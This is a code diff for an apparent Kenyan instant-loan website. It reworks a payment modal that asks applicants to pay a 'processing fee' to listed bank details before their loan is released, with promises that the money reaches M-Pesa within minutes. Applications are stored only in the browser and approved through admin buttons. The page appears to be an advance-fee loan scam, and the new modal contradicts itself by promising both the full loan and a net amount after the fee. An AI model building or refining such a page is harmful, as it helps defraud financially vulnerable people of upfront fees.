@@ -528,6 +528,8 @@
             position: relative;
             box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
             animation: modalSlide 0.3s ease;
+            max-height: 90vh;
+            overflow-y: auto;
         }
         
         @keyframes modalSlide {
@@ -578,36 +580,80 @@
             padding: 30px;
         }
         
-        .payment-summary {
-            background: #f0f9ff;
+        /* New styles for improved loan summary */
+        .loan-summary {
+            background: linear-gradient(135deg, #f0f9ff 0%, #e6f2f9 100%);
             border-radius: 12px;
             padding: 20px;
-            margin-bottom: 25px;
-            border: 1px solid #b8e1ff;
-            text-align: center;
+            margin-bottom: 20px;
+            border: 2px solid #0B4F6C;
         }
         
-        .payment-summary .label {
+        .loan-summary .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin: 10px 0;
+            padding: 8px 0;
+            border-bottom: 1px dashed #94a3b8;
+        }
+        
+        .loan-summary .summary-row:last-child {
+            border-bottom: none;
+        }
+        
+        .loan-summary .summary-total {
+            display: flex;
+            justify-content: space-between;
+            margin: 15px 0 5px;
+            padding: 10px 0;
+            border-top: 2px solid #0B4F6C;
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+        
+        .loan-summary .label {
+            color: #1e293b;
+            font-weight: 500;
+        }
+        
+        .loan-summary .value {
             color: #0B4F6C;
-            font-size: 0.95em;
+            font-weight: 600;
+        }
+        
+        .loan-summary .value.highlight {
+            color: #059669;
+            font-size: 1.3em;
+            font-weight: 700;
+        }
+        
+        .loan-summary .summary-total .value {
+            color: #059669;
+            font-size: 1.4em;
+        }
+        
+        .important-notice {
+            background: #dbeafe;
+            border-left: 4px solid #2563eb;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            color: #1e40af;
+        }
+        
+        .important-notice strong {
+            display: block;
             margin-bottom: 8px;
+            font-size: 1.1em;
         }
         
-        .payment-summary .amount {
-            font-size: 2.5em;
-            font-weight: 800;
-            color: #0B4F6C;
-            line-height: 1.2;
+        .important-notice p {
+            margin: 0;
+            line-height: 1.5;
         }
         
-        .payment-summary .description {
-            color: #64748b;
-            font-size: 0.9em;
-            margin-top: 8px;
-            background: white;
-            padding: 8px 15px;
-            border-radius: 50px;
-            display: inline-block;
+        .important-notice strong {
+            color: #1e40af;
         }
         
         .bank-details-grid {
@@ -913,6 +959,18 @@
         .admin-btn.approve:hover {
             background: #059669;
         }
+        
+        /* Qualified status card */
+        #qualifiedStatusCard {
+            display: none;
+            margin-top: 20px;
+        }
+        
+        #qualifiedStatusCard .apply-btn {
+            width: auto;
+            margin: 20px auto 0;
+            display: inline-block;
+        }
     </style>
 </head>
 <body>
@@ -1104,20 +1162,35 @@
         <p>Contact: <a href="mailto:support@scbquickloans.co.ke">support@scbquickloans.co.ke</a></p>
     </div>
     
-    <!-- Enhanced Payment Modal with Copy Functionality -->
+    <!-- IMPROVED PAYMENT MODAL with Clear Messaging -->
     <div class="modal" id="paymentModal">
         <div class="modal-content">
             <div class="modal-header">
                 <span class="modal-close" onclick="closePaymentModal()">&times;</span>
                 <h2>Complete Your Application</h2>
-                <p>Pay the processing fee to activate your loan</p>
+                <p>Pay the processing fee to receive your loan</p>
             </div>
             <div class="modal-body">
-                <!-- Payment Summary -->
-                <div class="payment-summary">
-                    <div class="label">Processing Fee Amount</div>
-                    <div class="amount" id="modalPaymentAmount">KSh 0</div>
-                    <div class="description">One-time fee for credit assessment & verification</div>
+                <!-- Loan Amount Summary - Shows the full picture -->
+                <div class="loan-summary">
+                    <div class="summary-row">
+                        <span class="label">You qualify for:</span>
+                        <span class="value highlight" id="modalLoanAmount">KSh 0</span>
+                    </div>
+                    <div class="summary-row">
+                        <span class="label">Processing fee required:</span>
+                        <span class="value" id="modalPaymentAmount">KSh 0</span>
+                    </div>
+                    <div class="summary-total">
+                        <span class="label">You will receive:</span>
+                        <span class="value" id="modalNetAmount">KSh 0</span>
+                    </div>
+                </div>
+                
+                <!-- Important Notice - Explains the process -->
+                <div class="important-notice">
+                    <strong>📌 How it works:</strong>
+                    <p>Pay the processing fee below to activate your loan. Once verified, the full loan amount of <strong id="modalLoanAmount2">KSh 0</strong> will be sent to your M-Pesa number within minutes.</p>
                 </div>
                 
                 <!-- Bank Details with Copy Buttons -->
@@ -1206,8 +1279,9 @@
                     SUBMIT FOR VERIFICATION
                 </button>
                 
+                <!-- Verification Notice with Loan Amount -->
                 <div class="verification-notice" style="margin-top: 15px;">
-                    <p style="margin: 0;">Your application will be verified within 5-10 minutes. You'll be notified once approved.</p>
+                    <p style="margin: 0;">Your application will be verified within 5-10 minutes. Once approved, <strong id="modalLoanAmount3">KSh 0</strong> will be sent to your M-Pesa.</p>
                 </div>
             </div>
         </div>
@@ -1310,7 +1384,7 @@
         localStorage.setItem('scb_applications', JSON.stringify(applications));
 
         // ================ SAFARICOM VALIDATION ================
-        // Strict Safaricom prefixes based on official sources [citation:3][citation:4]
+        // Strict Safaricom prefixes based on official sources 
         
         function isSafaricomNumber(phone) {
             // Remove any non-numeric characters
@@ -1324,17 +1398,16 @@
             
             // Safaricom prefixes from official sources
             const safaricomPrefixes = [
-                '070', '071', '072', '074', '075', '076', '079', // 07xx series [citation:3][citation:9]
-                '011', '010' // 01xx series - 0110-0115 are Safaricom [citation:4][citation:10]
+                '070', '071', '072', '074', '075', '076', '079', // 07xx series 
+                '011', '010' // 01xx series - 0110-0115 are Safaricom 
             ];
             
             // Check if prefix is in Safaricom list
             if (safaricomPrefixes.includes(prefix)) {
                 // Additional validation for specific ranges
-                const secondDigit = numericPhone.substring(1, 2);
                 const thirdDigit = numericPhone.substring(2, 3);
                 
-                // 0740-0743, 0745-0746, 0748 are Safaricom [citation:4]
+                // 0740-0743, 0745-0746, 0748 are Safaricom 
                 if (prefix === '074') {
                     const valid074 = ['0', '1', '2', '3', '5', '6', '8'];
                     return valid074.includes(thirdDigit);
@@ -1350,7 +1423,7 @@
                     return ['8', '9'].includes(thirdDigit);
                 }
                 
-                // 0110-0115 are Safaricom [citation:4]
+                // 0110-0115 are Safaricom 
                 if (prefix === '011') {
                     return ['0', '1', '2', '3', '4', '5'].includes(thirdDigit);
                 }
@@ -1810,6 +1883,8 @@
             applyBtn.disabled = !(acceptTnc.checked && hasScanned && qualifiedAmount > 0 && isBindingValid);
         }
         
+        // ================ IMPROVED: Payment Modal Functions ================
+        
         function openPaymentModal() {
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
             
@@ -1828,7 +1903,14 @@
                 return;
             }
             
+            const netAmount = qualifiedAmount - processingFee;
+            
+            // Update modal with all amounts
+            document.getElementById('modalLoanAmount').textContent = `KSh ${qualifiedAmount.toLocaleString()}`;
+            document.getElementById('modalLoanAmount2').textContent = `KSh ${qualifiedAmount.toLocaleString()}`;
+            document.getElementById('modalLoanAmount3').textContent = `KSh ${qualifiedAmount.toLocaleString()}`;
             document.getElementById('modalPaymentAmount').textContent = `KSh ${processingFee.toLocaleString()}`;
+            document.getElementById('modalNetAmount').textContent = `KSh ${netAmount.toLocaleString()}`;
             document.getElementById('instructionAmount').textContent = `KSh ${processingFee.toLocaleString()}`;
             document.getElementById('copyAmount').textContent = processingFee;
             document.getElementById('paymentModal').style.display = 'flex';
